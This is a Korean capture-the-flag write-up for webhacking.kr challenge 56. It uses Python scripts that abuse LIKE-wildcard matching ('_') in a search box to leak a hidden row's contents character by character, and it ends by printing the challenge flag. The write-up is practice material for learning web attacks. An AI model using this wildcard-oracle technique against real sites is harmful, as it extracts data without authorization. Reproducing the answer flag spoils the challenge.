#56
==

테이블이 보이고 검색창이 보인다.

![]()

이것저것 검색을 해보았더니 다음과 같은 특정 패턴을 알아내었다.

`admin만 나오거나 guest만 나오거나 둘 다 나오거나 아니면 둘 다 안나오거나`

그러면 admin이 나오게 하는 것에는 무엇이 있는가 알기 위해 아래와 같이 파이썬 코드를 작성해보았다.

```python
import requests

answer= ""
for j in range(32,127):
    url = "https://webhacking.kr/challenge/web-33/"
    res = requests.post(url, data={'search': chr(j)})
    if res.text.find('admin') != -1:
        answer=answer+chr(j)
        print(answer)
            
print('정답')
print(answer)
```

그랬더니 다음과 같은 것들이 admin이 나오게 하는 것임을 알 수 있었다.

`%0?ACDEFGHIKLMNOSTUY_acdefghiklmnostuy{}`

여기서 `_` 이것은 임의의 숫자나 문자를 의미한다.  
따라서 `_`을 이용해서 admin이 나오게하는 문구의 글자 수를 알 수 있게된다.

다음과 같이 코드를 작성하여 글자 수를 구해보았다.

```python
import requests

d="_"
for j in range(1,50):
    url = "https://webhacking.kr/challenge/web-33/"
    res = requests.post(url, data={'search': d})
    if res.text.find('readme') != -1:
        d=d+'_'
        print(d)
            
print('정답')
len(d)

답 : 45
```

총 45글자인 것을 알 수 있었다.

모두 종합을 해보면 admin이 나오게하는 문구는 `%0?ACDEFGHIKLMNOSTUY_acdefghiklmnostuy{}` 로 이루어져 있으며 총 45자이다.

따라서 앞에서부터 한자리씩 아스키코드값 32부터 127까지 비교해보면 admin이 나오는 값을 구할 수 있다.

```python
import requests

length_num=44

result='0?ACDEFGHIKLMNOSTUY_acdefghiklmnostuy{}'
readme=''
for i in range(length_num):
    for j in result:
        search = "_"*i + str(j) +"_"*(length_num-1-i)
        url = "https://webhacking.kr/challenge/web-33/"
        res = requests.post(url, data={'search': search})
        if res.text.find('readme') != -1:
            readme+=str(j)
            print(j)
            break
            
print(readme)
```

`FLAG{HIMIKO_TOGA_IS_CUTE_DONT_YOU_THINK_SO?}`
